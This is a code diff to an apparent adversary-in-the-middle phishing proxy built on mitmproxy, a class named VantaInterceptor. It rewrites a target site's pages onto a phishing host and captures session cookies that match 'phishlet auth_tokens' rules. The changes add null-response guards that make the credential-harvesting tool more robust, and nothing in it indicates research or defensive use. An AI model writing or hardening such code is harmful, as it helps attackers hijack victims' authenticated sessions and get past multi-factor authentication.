@@ -510,6 +510,8 @@ class VantaInterceptor:
     def _rewrite_response_body(self, flow: http.HTTPFlow):
         """Rewrite URLs and other content in the response body."""
         try:
+            if not getattr(flow, "response", None):
+                return
             content_type = flow.response.headers.get("content-type", "")
             ph_host = getattr(flow, "metadata", {}).get("v_ph_host")
             tgt_host = getattr(flow, "metadata", {}).get("v_tgt_host")
@@ -614,6 +616,8 @@ class VantaInterceptor:
             session_id = getattr(flow, "metadata", {}).get("v_session_id")
             if not session_id: return
 
+            if not getattr(flow, "response", None):
+                return
             cookies = flow.response.cookies
             for name, (value, attrs) in cookies.items():
                 # Check against phishlet auth_tokens rules
@@ -636,7 +640,7 @@ class VantaInterceptor:
     def _apply_sub_filters(self, flow: http.HTTPFlow):
         """Apply string replacements on response body based on sub_filters"""
         try:
-            if not flow.response.content: return
+            if not getattr(flow, "response", None) or not flow.response.content: return
             
             content_type = flow.response.headers.get("content-type", "")
             ph_host = getattr(flow, "metadata", {}).get("v_ph_host")
@@ -727,13 +731,13 @@ class VantaInterceptor:
                     # But Python's replace is literal.
                     # Let's try literal first.
                     applied = False
-                    if search_str in flow.response.text:
+                    if getattr(flow, "response", None) and flow.response.text and search_str in flow.response.text:
                         flow.response.text = flow.response.text.replace(search_str, replace_str)
                         applied = True
                     # Also handle trailing slash variant
                     s2 = search_str + "/"
                     r2 = replace_str + "/" if not replace_str.endswith("/") else replace_str
-                    if s2 in flow.response.text:
+                    if getattr(flow, "response", None) and flow.response.text and s2 in flow.response.text:
                         flow.response.text = flow.response.text.replace(s2, r2)
                         applied = True
                     if applied:
